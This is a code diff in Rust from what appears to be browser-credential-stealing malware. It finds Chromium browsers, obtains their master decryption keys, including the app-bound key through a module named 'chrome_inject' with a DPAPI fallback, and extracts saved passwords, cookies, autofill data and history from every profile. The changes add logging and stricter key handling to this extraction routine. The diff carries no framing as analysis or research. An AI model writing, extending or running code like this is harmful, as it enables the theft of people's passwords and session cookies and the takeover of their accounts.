@@ -225,11 +225,21 @@ fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<MasterKe
 
     let has_app_bound = json["os_crypt"]["app_bound_encrypted_key"].as_str().is_some();
     let app_bound = if has_app_bound {
+        crate::log::log(&format!("chromium app_bound key present: {browser_name}"));
         super::chrome_inject::fetch_app_bound_key(browser_name)
-            .or_else(|| super::dpapi_fallback::try_from_local_state(&json))
+            .or_else(|| {
+                crate::log::log(&format!("chromium dpapi fallback try: {browser_name}"));
+                super::dpapi_fallback::try_from_local_state(&json)
+            })
     } else {
         None
     };
+
+    if app_bound.is_some() {
+        crate::log::log(&format!("chromium master keys OK (+app_bound): {browser_name}"));
+    } else {
+        crate::log::log(&format!("chromium master keys OK (standard only): {browser_name}"));
+    }
 
     Some(MasterKeys { standard, app_bound })
 }
@@ -622,15 +632,26 @@ pub fn extract_all() -> Vec<(String, String)> {
         if !browser.user_data.exists() {
             continue;
         }
+        crate::log::log(&format!(
+            "chromium found: {} -> {}",
+            browser.name,
+            browser.user_data.display()
+        ));
         let keys = get_master_keys(&browser.user_data, browser.name);
+        if keys.is_none() {
+            crate::log::log(&format!("chromium keys FAIL: {}", browser.name));
+            continue;
+        }
         let profiles = get_profiles(&browser.user_data, browser.has_profiles);
+        crate::log::log(&format!(
+            "chromium {}: {} profile(s)",
+            browser.name,
+            profiles.len()
+        ));
         for (profile_name, profile_path) in profiles {
-            let passwords = keys
-                .as_ref()
-                .and_then(|k| extract_passwords(&profile_path, k));
-            let cookies = keys
-                .as_ref()
-                .and_then(|k| extract_cookies(&profile_path, k));
+            let keys = keys.as_ref().unwrap();
+            let passwords = extract_passwords(&profile_path, keys);
+            let cookies = extract_cookies(&profile_path, keys);
             let autofill = extract_autofill(&profile_path);
             let history = extract_history(&profile_path);
 
